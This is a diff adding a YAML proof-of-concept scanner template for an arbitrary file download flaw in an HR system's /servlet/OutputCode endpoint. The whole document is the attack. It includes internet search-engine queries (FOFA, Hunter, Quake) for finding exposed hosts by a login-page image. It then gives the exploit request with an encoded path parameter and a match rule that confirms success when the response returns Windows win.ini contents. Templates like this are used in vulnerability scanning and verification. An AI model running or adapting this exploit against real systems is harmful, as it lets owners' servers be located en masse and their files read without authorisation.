@@ -1,0 +1,40 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: body="/images/login/line.gif"
+    hunter-query: web.body="/images/login/line.gif"
+    quake-query: body:"/images/login/line.gif"
+    zoomeye-query: #
+    threatbook-query: # 不在跟进
+    cve: 
+    cnvd:  
+    
+name: poc-yaml-Hcm-hr-OutputCode-file-download
+transport: http
+set:
+  s0: randomInt(1000,9999)
+  s1: randomInt(10000,99999)
+  s2: randomLowercase(8)
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /servlet/OutputCode?path=Ix1E5Anj26gg4vfnak8pSKVU3Fi5TGhY
+      follow_redirects: false
+      headers:
+      body: 
+  
+    expression: >-
+      response.status == 200 && ( response.body_string.contains("[fonts]") || response.body_string.contains("[extensions]") || response.body_string.contains("[mci extensions]") || response.body_string.contains("[files]") || response.body_string.contains("[Mail]") )
+
+
+    output:
+      search: |-
+        "(?P<token>\\w+)".bsubmatch(response.body)
+      token: search["token"]
+
+expression: r0() 
